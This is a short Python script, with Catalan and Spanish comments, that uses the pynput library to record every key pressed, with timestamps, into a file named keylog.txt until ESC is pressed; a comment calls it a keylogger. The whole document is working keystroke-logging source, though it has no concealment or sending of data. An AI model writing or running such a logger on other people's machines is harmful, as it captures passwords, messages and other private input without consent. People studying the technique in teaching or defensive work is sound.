from pynput import keyboard
import logging

# Confiiguració de l'arxiu de registre
logging.basicConfig(filename="keylog.txt", level=logging.DEBUG, format='%(asctime)s - %(message)s')

def on_press(key):
    try:
        logging.info(f"Tecla presionada: {key.char}")
    except AttributeError:
        logging.info(f"Tecla especial presionada: {key}")

def on_release(key):
    if key == keyboard.Key.esc:
        # Parem el keylogger quan s'apreta la tecla ESC
        return False

# Iniciar el listener
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
